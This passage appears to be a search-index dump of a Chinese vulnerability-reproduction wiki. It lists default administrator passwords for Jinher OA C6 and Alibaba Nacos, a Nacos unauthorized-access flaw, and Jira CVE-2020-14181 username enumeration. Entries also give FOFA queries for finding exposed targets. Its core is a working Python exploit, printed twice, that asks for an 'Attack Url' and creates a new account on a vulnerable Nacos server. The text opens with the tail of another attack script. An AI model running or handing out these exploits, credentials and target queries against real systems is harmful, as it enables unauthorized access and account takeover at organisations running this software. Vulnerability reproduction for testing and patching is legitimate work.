\u76ee\u6807 {} \u6587\u4ef6\u4e0d\u5b58\u5728 \\033 [0m\" . format ( target_url )) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) file_id = str ( input ( \" \\033 [35mFile_id >>> \\033 [0m\" )) cookie = str ( input ( \" \\033 [35mCookie >>> \\033 [0m\" )) POC_1 ( target_url , file_id , cookie )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%92%8COA/%E9%87%91%E5%92%8COA%20C6%20%E7%AE%A1%E7%90%86%E5%91%98%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/","text":"\u91d1\u548cOA C6 \u7ba1\u7406\u5458\u9ed8\u8ba4\u53e3\u4ee4 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u91d1\u548cOA C6 \u5b58\u5728\u7ba1\u7406\u5458\u9ed8\u8ba4\u8d26\u6237\u53e3\u4ee4 admin/000000 \uff0c\u653b\u51fb\u8005\u5c06\u4ee5\u7ba1\u7406\u5458\u8eab\u4efd\u767b\u9646\u540e\u53f0 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u91d1\u548cOA FOFA \u00b6 [!NOTE] app=\"Jinher-OA\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8d26\u53f7\u5bc6\u7801 admin/000000 \u767b\u5f55\u540e\u53f0 Goby & POC \u00b6 [!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d JingHe_OA_C6_Default_password","title":"\u91d1\u548cOA C6 \u7ba1\u7406\u5458\u9ed8\u8ba4\u53e3\u4ee4"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%92%8COA/%E9%87%91%E5%92%8COA%20C6%20%E7%AE%A1%E7%90%86%E5%91%98%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/#\u91d1\u548coa-c6-\u7ba1\u7406\u5458\u9ed8\u8ba4\u53e3\u4ee4","text":"","title":"\u91d1\u548cOA C6 \u7ba1\u7406\u5458\u9ed8\u8ba4\u53e3\u4ee4"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%92%8COA/%E9%87%91%E5%92%8COA%20C6%20%E7%AE%A1%E7%90%86%E5%91%98%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u91d1\u548cOA C6 \u5b58\u5728\u7ba1\u7406\u5458\u9ed8\u8ba4\u8d26\u6237\u53e3\u4ee4 admin/000000 \uff0c\u653b\u51fb\u8005\u5c06\u4ee5\u7ba1\u7406\u5458\u8eab\u4efd\u767b\u9646\u540e\u53f0","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%92%8COA/%E9%87%91%E5%92%8COA%20C6%20%E7%AE%A1%E7%90%86%E5%91%98%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u91d1\u548cOA","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%92%8COA/%E9%87%91%E5%92%8COA%20C6%20%E7%AE%A1%E7%90%86%E5%91%98%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/#fofa","text":"[!NOTE] app=\"Jinher-OA\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%92%8COA/%E9%87%91%E5%92%8COA%20C6%20%E7%AE%A1%E7%90%86%E5%91%98%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/#\u6f0f\u6d1e\u590d\u73b0","text":"\u8d26\u53f7\u5bc6\u7801 admin/000000 \u767b\u5f55\u540e\u53f0","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%92%8COA/%E9%87%91%E5%92%8COA%20C6%20%E7%AE%A1%E7%90%86%E5%91%98%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/#goby--poc","text":"[!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d JingHe_OA_C6_Default_password","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Alibaba%20Nacos/Alibaba%20Nacos%20%E6%8E%A7%E5%88%B6%E5%8F%B0%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4/","text":"Alibaba Nacos \u63a7\u5236\u53f0\u9ed8\u8ba4\u5f31\u53e3\u4ee4 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Alibaba Nacos \u63a7\u5236\u53f0\u5b58\u5728\u9ed8\u8ba4\u5f31\u53e3\u4ee4 nacos/nacos \uff0c\u53ef\u767b\u5f55\u540e\u53f0\u67e5\u770b\u654f\u611f\u4fe1\u606f \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] Alibaba Nacos \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u53d1\u9001\u5982\u4e0b\u8bf7\u6c42 \u8fd4\u56de200\u8bf4\u660e\u6210\u529f\u767b\u5f55 Goby & POC \u00b6 [!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d Alibaba_Nacos_Default_password.json","title":"Alibaba Nacos \u63a7\u5236\u53f0\u9ed8\u8ba4\u5f31\u53e3\u4ee4"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Alibaba%20Nacos/Alibaba%20Nacos%20%E6%8E%A7%E5%88%B6%E5%8F%B0%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4/#alibaba-nacos-\u63a7\u5236\u53f0\u9ed8\u8ba4\u5f31\u53e3\u4ee4","text":"","title":"Alibaba Nacos \u63a7\u5236\u53f0\u9ed8\u8ba4\u5f31\u53e3\u4ee4"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Alibaba%20Nacos/Alibaba%20Nacos%20%E6%8E%A7%E5%88%B6%E5%8F%B0%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4/#\u6f0f\u6d1e\u63cf\u8ff0","text":"Alibaba Nacos \u63a7\u5236\u53f0\u5b58\u5728\u9ed8\u8ba4\u5f31\u53e3\u4ee4 nacos/nacos \uff0c\u53ef\u767b\u5f55\u540e\u53f0\u67e5\u770b\u654f\u611f\u4fe1\u606f","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Alibaba%20Nacos/Alibaba%20Nacos%20%E6%8E%A7%E5%88%B6%E5%8F%B0%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] Alibaba Nacos","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Alibaba%20Nacos/Alibaba%20Nacos%20%E6%8E%A7%E5%88%B6%E5%8F%B0%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4/#\u6f0f\u6d1e\u590d\u73b0","text":"\u53d1\u9001\u5982\u4e0b\u8bf7\u6c42 \u8fd4\u56de200\u8bf4\u660e\u6210\u529f\u767b\u5f55","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Alibaba%20Nacos/Alibaba%20Nacos%20%E6%8E%A7%E5%88%B6%E5%8F%B0%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4/#goby--poc","text":"[!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d Alibaba_Nacos_Default_password.json","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Alibaba%20Nacos/Alibaba%20Nacos%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/","text":"Alibaba Nacos \u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 2020\u5e7412\u670829\u65e5\uff0cNacos\u5b98\u65b9\u5728github\u53d1\u5e03\u7684issue\u4e2d\u62ab\u9732Alibaba Nacos \u5b58\u5728\u4e00\u4e2a\u7531\u4e8e\u4e0d\u5f53\u5904\u7406User-Agent\u5bfc\u81f4\u7684\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e \u3002\u901a\u8fc7\u8be5\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u8fdb\u884c\u4efb\u610f\u64cd\u4f5c\uff0c\u5305\u62ec\u521b\u5efa\u65b0\u7528\u6237\u5e76\u8fdb\u884c\u767b\u5f55\u540e\u64cd\u4f5c\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] Nacos <= 2.0.0-ALPHA.1 FOFA \u00b6 [!NOTE] title=\"Nacos\" \u73af\u5883\u642d\u5efa \u00b6 https://github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1 wget https://github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1 tar -zxvf nacos-server-2.0.0-ALPHA.1.tar.gz ./startup.sh -m standalone \u7136\u540e\u8bbf\u95ee http://xxx.xxx.xxx.xxx:8848/nacos \u5373\u53ef\uff0c\u9ed8\u8ba4\u8d26\u53f7\u5bc6\u7801 nacos/nacos \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u53ef\u4ee5\u518d\u9879\u76ee\u7684 issues \u4e2d\u770b\u5230\u5927\u91cf\u7684\u5173\u4e8e\u8d8a\u6743\u7684\u5b89\u5168\u95ee\u9898\u7684\u8ba8\u8bba https://github.com/alibaba/nacos/issues/1105 \u8fd9\u91cc\u6211\u4eec\u5728\u767b\u5f55\u540e\u4efb\u610f\u4e00\u4e2a\u4f4d\u7f6e\u770b\u4e00\u4e0b\u8bf7\u6c42\uff0c\u5e76\u5728\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b\u770b\u662f\u5426\u53ef\u4ee5\u8bbf\u95ee \u8fd9\u91cc\u7684\u8bf7\u6c42url\u7b80\u5316\u4e3a http://xxx.xxx.xxx.xxx:8848/nacos/v1/core/cluster/nodes?withInstances=false&pageNo=1&pageSize=10&keyword= \u9000\u51fa\u7528\u6237\u540e\u5728\u524d\u53f0\u8bbf\u95ee\u8fd9\u4e2a url \u53ef\u4ee5\u53d1\u73b0\u4ee5\u53ca\u6cc4\u9732\u4e86 ip\u8282\u70b9 \u7b49\u6570\u636e \u540c\u6837\u6211\u4eec\u67e5\u770b\u7528\u6237\u5217\u8868\u7684\u8bf7\u6c42\u5e76\u5728\u524d\u53f0\u8bbf\u95ee http://xxx.xxx.xxx.xxx:8848/nacos/v1/auth/users?pageNo=1&pageSize=9 \u8fd9\u91cc\u53ef\u4ee5\u53d1\u73b0\u5bf9\u7528\u6237\u7684\u8bf7\u6c42\u662f\u5b8c\u5168\u6ca1\u6709\u8fc7\u6ee4\u7684\uff0c\u53ef\u4ee5\u901a\u8fc7\u672a\u6388\u6743\u7684\u60c5\u51b5\u83b7\u53d6\u7528\u6237\u7684\u654f\u611f\u4fe1\u606f \u6211\u4eec\u5c1d\u8bd5\u521b\u5efa\u7528\u6237\u5e76\u6293\u5305 \u8fd4\u56de\u4e0b\u5217\u521b\u5efa\u6210\u529f {\"code\":200,\"message\":\"create user ok!\",\"data\":null} \u540c\u6837\u7684\u6211\u4eec\u7b80\u5316\u8bf7\u6c42 POST /nacos/v1/auth/users? username=peiqi&password=peiqi \u770b\u5230\u6709\u6587\u7ae0\u8bf4\u8981\u52a0\u4e0a**User-Agent\u8bf7\u6c42\u5934** User-Agent: Nacos-Server \u4f46\u662f\u5927\u91cf\u6d4b\u8bd5\u4e4b\u540e\u53d1\u73b0\u597d\u50cf\u662f\u65e0\u5173\u7d27\u8981\u7684\uff0c\u6ca1\u6709\u8bf7\u6c42\u5934\u540c\u6837\u53ef\u4ee5\u521b\u5efa\u7528\u6237 [!NOTE] \u540c\u6837\u7684\u539f\u7406\u4e5f\u53ef\u4ee5\u7528\u4e8e\u4fee\u6539\u5bc6\u7801\u6dfb\u52a0\u914d\u7f6e\u7b49 \u6f0f\u6d1e\u5229\u7528POC \u00b6 [!NOTE] \u6ce8\u610f\u4e0b\u5927\u90e8\u5206\u4f01\u4e1a\u7684 nacos\u7684url\u4e3a /v1/auth/users \uff0c\u800c\u4e0d\u662f /nacos/v1/auth/users \u53ef\u4ee5\u6309\u76ee\u6807\u60c5\u51b5\u81ea\u884c\u4fee\u6539 import requests import sys import random from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Nacos <= 2.0.0-ALPHA.1 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): # vuln_url = target_url + \"/nacos/v1/auth/users\" vuln_url = target_url + \"/v1/auth/users\" headers = { \"User-Agent\" : \"Nacos-Server\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" , } number = random . randint ( 0 , 999 ) data = \"username=peiqi {} &password=peiqi\" . format ( str ( number )) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , data = data , verify = False , timeout = 5 ) print ( \" \\033 [32m[o] \u6b63\u5728\u8bf7\u6c42 {} /nacos/v1/auth/users \\033 [0m\" . format ( target_url )) if \"create user ok!\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] \u6210\u529f\u521b\u5efa\u8d26\u6237 peiqi {} peiqi \\033 [0m\" . format ( str ( number ))) else : print ( \" \\033 [31m[x] \u521b\u5efa\u7528\u6237\u8bf7\u6c42\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url ) Goby & POC \u00b6 \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d Alibaba_Nacos_Add_user_not_authorized.json","title":"Alibaba Nacos \u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Alibaba%20Nacos/Alibaba%20Nacos%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#alibaba-nacos-\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e","text":"","title":"Alibaba Nacos \u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Alibaba%20Nacos/Alibaba%20Nacos%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"2020\u5e7412\u670829\u65e5\uff0cNacos\u5b98\u65b9\u5728github\u53d1\u5e03\u7684issue\u4e2d\u62ab\u9732Alibaba Nacos \u5b58\u5728\u4e00\u4e2a\u7531\u4e8e\u4e0d\u5f53\u5904\u7406User-Agent\u5bfc\u81f4\u7684\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e \u3002\u901a\u8fc7\u8be5\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u8fdb\u884c\u4efb\u610f\u64cd\u4f5c\uff0c\u5305\u62ec\u521b\u5efa\u65b0\u7528\u6237\u5e76\u8fdb\u884c\u767b\u5f55\u540e\u64cd\u4f5c\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Alibaba%20Nacos/Alibaba%20Nacos%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] Nacos <= 2.0.0-ALPHA.1","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Alibaba%20Nacos/Alibaba%20Nacos%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#fofa","text":"[!NOTE] title=\"Nacos\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Alibaba%20Nacos/Alibaba%20Nacos%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#\u73af\u5883\u642d\u5efa","text":"https://github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1 wget https://github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1 tar -zxvf nacos-server-2.0.0-ALPHA.1.tar.gz ./startup.sh -m standalone \u7136\u540e\u8bbf\u95ee http://xxx.xxx.xxx.xxx:8848/nacos \u5373\u53ef\uff0c\u9ed8\u8ba4\u8d26\u53f7\u5bc6\u7801 nacos/nacos","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Alibaba%20Nacos/Alibaba%20Nacos%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u53ef\u4ee5\u518d\u9879\u76ee\u7684 issues \u4e2d\u770b\u5230\u5927\u91cf\u7684\u5173\u4e8e\u8d8a\u6743\u7684\u5b89\u5168\u95ee\u9898\u7684\u8ba8\u8bba https://github.com/alibaba/nacos/issues/1105 \u8fd9\u91cc\u6211\u4eec\u5728\u767b\u5f55\u540e\u4efb\u610f\u4e00\u4e2a\u4f4d\u7f6e\u770b\u4e00\u4e0b\u8bf7\u6c42\uff0c\u5e76\u5728\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b\u770b\u662f\u5426\u53ef\u4ee5\u8bbf\u95ee \u8fd9\u91cc\u7684\u8bf7\u6c42url\u7b80\u5316\u4e3a http://xxx.xxx.xxx.xxx:8848/nacos/v1/core/cluster/nodes?withInstances=false&pageNo=1&pageSize=10&keyword= \u9000\u51fa\u7528\u6237\u540e\u5728\u524d\u53f0\u8bbf\u95ee\u8fd9\u4e2a url \u53ef\u4ee5\u53d1\u73b0\u4ee5\u53ca\u6cc4\u9732\u4e86 ip\u8282\u70b9 \u7b49\u6570\u636e \u540c\u6837\u6211\u4eec\u67e5\u770b\u7528\u6237\u5217\u8868\u7684\u8bf7\u6c42\u5e76\u5728\u524d\u53f0\u8bbf\u95ee http://xxx.xxx.xxx.xxx:8848/nacos/v1/auth/users?pageNo=1&pageSize=9 \u8fd9\u91cc\u53ef\u4ee5\u53d1\u73b0\u5bf9\u7528\u6237\u7684\u8bf7\u6c42\u662f\u5b8c\u5168\u6ca1\u6709\u8fc7\u6ee4\u7684\uff0c\u53ef\u4ee5\u901a\u8fc7\u672a\u6388\u6743\u7684\u60c5\u51b5\u83b7\u53d6\u7528\u6237\u7684\u654f\u611f\u4fe1\u606f \u6211\u4eec\u5c1d\u8bd5\u521b\u5efa\u7528\u6237\u5e76\u6293\u5305 \u8fd4\u56de\u4e0b\u5217\u521b\u5efa\u6210\u529f {\"code\":200,\"message\":\"create user ok!\",\"data\":null} \u540c\u6837\u7684\u6211\u4eec\u7b80\u5316\u8bf7\u6c42 POST /nacos/v1/auth/users? username=peiqi&password=peiqi \u770b\u5230\u6709\u6587\u7ae0\u8bf4\u8981\u52a0\u4e0a**User-Agent\u8bf7\u6c42\u5934** User-Agent: Nacos-Server \u4f46\u662f\u5927\u91cf\u6d4b\u8bd5\u4e4b\u540e\u53d1\u73b0\u597d\u50cf\u662f\u65e0\u5173\u7d27\u8981\u7684\uff0c\u6ca1\u6709\u8bf7\u6c42\u5934\u540c\u6837\u53ef\u4ee5\u521b\u5efa\u7528\u6237 [!NOTE] \u540c\u6837\u7684\u539f\u7406\u4e5f\u53ef\u4ee5\u7528\u4e8e\u4fee\u6539\u5bc6\u7801\u6dfb\u52a0\u914d\u7f6e\u7b49","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Alibaba%20Nacos/Alibaba%20Nacos%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5229\u7528poc","text":"[!NOTE] \u6ce8\u610f\u4e0b\u5927\u90e8\u5206\u4f01\u4e1a\u7684 nacos\u7684url\u4e3a /v1/auth/users \uff0c\u800c\u4e0d\u662f /nacos/v1/auth/users \u53ef\u4ee5\u6309\u76ee\u6807\u60c5\u51b5\u81ea\u884c\u4fee\u6539 import requests import sys import random from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Nacos <= 2.0.0-ALPHA.1 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): # vuln_url = target_url + \"/nacos/v1/auth/users\" vuln_url = target_url + \"/v1/auth/users\" headers = { \"User-Agent\" : \"Nacos-Server\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" , } number = random . randint ( 0 , 999 ) data = \"username=peiqi {} &password=peiqi\" . format ( str ( number )) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , data = data , verify = False , timeout = 5 ) print ( \" \\033 [32m[o] \u6b63\u5728\u8bf7\u6c42 {} /nacos/v1/auth/users \\033 [0m\" . format ( target_url )) if \"create user ok!\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] \u6210\u529f\u521b\u5efa\u8d26\u6237 peiqi {} peiqi \\033 [0m\" . format ( str ( number ))) else : print ( \" \\033 [31m[x] \u521b\u5efa\u7528\u6237\u8bf7\u6c42\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Alibaba%20Nacos/Alibaba%20Nacos%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#goby--poc","text":"\u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d Alibaba_Nacos_Add_user_not_authorized.json","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Atlassian%20Jira/Atlassian%20Jira%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2020-14181/","text":"Atlassian Jira \u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e CVE-2020-14181 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Jira\u5b58\u5728\u4e00\u4e2a\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\uff0c\u672a\u6388\u6743\u7684\u7528\u6237\u53ef\u4ee5\u901a\u8fc7\u4e00\u4e2aapi\u63a5\u53e3\u76f4\u63a5\u67e5\u8be2\u5230\u67d0\u7528\u6237\u540d\u7684\u5b58\u5728\u60c5\u51b5\uff0c\u8be5\u63a5\u53e3\u4e0d\u540c\u4e8eCVE-2019-8446\u548cCVE-2019-3403\u7684\u63a5\u53e3\uff0c\u662f\u4e00\u4e2a\u65b0\u7684\u63a5\u53e3\u3002\u5982\u679cJira\u66b4\u9732\u5728\u516c\u7f51\u4e2d\uff0c\u672a\u6388\u6743\u7528\u6237\u5c31\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee\u8be5\u63a5\u53e3\u7206\u7834\u51fa\u6f5c\u5728\u7684\u7528\u6237\u540d\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] Atlassian Jira < 7.13.6 Atlassian Jira 8.0.0 - 8.5.7 Atlassian Jira 8.6.0 - 8.12.0 FOFA \u00b6 [!NOTE] app=\"Jira\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u6253\u5f00\u4e3b\u754c\u9762\uff0c\u6ce8\u610f\u6807\u8bc6\u4e2d\u7684 Jira\u7248\u672c\u662f\u5426\u5728\u5f71\u54cd\u4e2d \u4f7f\u7528POC\u5bf9\u7528\u6237\u540d\u662f\u5426\u5b58\u5728\u8fdb\u884c\u9a8c\u8bc1 http://xxx.xxx.xxx.xxx/secure/ViewUserHover.jspa?username=admin \u7528\u6237\u540d\u5982\u679c\u4e0d\u5b58\u5728\u4f1a\u8fd4\u56de \u5b58\u5728\u7684\u7528\u6237\u540d\u4f1a\u8fd4\u56de \u4e0d\u5b58\u5728\u6f0f\u6d1e\u4f1a\u8fd4\u56de \u6f0f\u6d1e\u5229\u7528POC \u00b6 [!NOTE] POC\u53ea\u7528\u4e8e\u63a2\u6d4b\u662f\u5426\u5b58\u5728\u6f0f\u6d1e \u7206\u7834\u53ef\u4f7f\u7528: 